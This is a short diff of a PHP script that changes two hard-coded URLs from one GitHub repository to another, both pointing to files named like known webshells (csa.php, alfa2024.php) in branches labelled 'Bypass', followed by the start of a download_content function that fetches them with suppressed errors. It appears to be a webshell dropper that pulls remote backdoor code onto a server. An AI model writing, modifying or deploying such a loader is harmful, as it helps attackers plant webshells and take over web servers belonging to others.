@@ -1,7 +1,7 @@
 <?php
 
-$url1 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/csa.php';
-$url2 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/alfa2024.php';
+$url1 = 'https://raw.githubusercontent.com/veekce/vkc/refs/heads/Bypass-Veekc/csa.php';
+$url2 = 'https://raw.githubusercontent.com/veekce/vkc/refs/heads/Bypass-Veekc/alfa2024.php';
 
 function download_content($url) {
     $content = @file_get_contents($url);
